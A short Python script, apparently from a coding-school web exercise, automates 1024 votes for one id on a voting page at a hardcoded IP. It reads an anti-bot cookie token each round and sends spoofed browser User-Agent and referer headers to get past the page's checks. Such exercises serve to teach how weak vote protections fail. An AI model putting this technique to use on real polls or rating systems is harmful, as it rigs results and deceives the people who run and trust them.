#!/usr/bin/python3
"""
Program that votes 1024 times for my id.
"""
import requests


url = 'http://158.69.76.135/level2.php'
header = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0)\
        Gecko/20100101 Firefox/64.0',
    'referer': url
}

with requests.session() as session:
    for i in range(1024):

        res = session.get(url)
        value = res.cookies['HoldTheDoor']

        params = {
            "id": "3779",
            "holdthedoor": "submit",
            "key": value
        }

        votes = session.post(url, data=params, headers=header)
    print(votes.text)
    print(votes.status_code)
